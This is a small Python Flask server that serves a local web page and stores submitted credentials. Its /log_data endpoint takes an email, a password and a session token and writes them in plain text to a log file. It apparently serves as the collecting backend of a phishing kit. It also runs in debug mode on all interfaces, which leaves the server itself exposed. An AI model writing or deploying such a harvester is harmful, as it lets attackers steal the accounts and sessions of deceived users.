from flask import Flask, request, jsonify, send_from_directory
import datetime

app = Flask(__name__)

LOG_FILE = "server_log.txt"

@app.route("/")
def serve_index():
    return send_from_directory(".", "index.html")

@app.route("/<path:filename>")
def serve_static(filename):
    return send_from_directory(".", filename)

@app.route("/log_data", methods=["POST"])
def log_data():
    data = request.json
    email = data.get("email", "Unknown")
    password = data.get("password", "Unknown")
    token = data.get("token", "Unknown")

    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(f"[{datetime.datetime.now()}] Email: {email}, Password: {password}, Token: {token}\n")

    return jsonify({"status": "logged"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=8000)
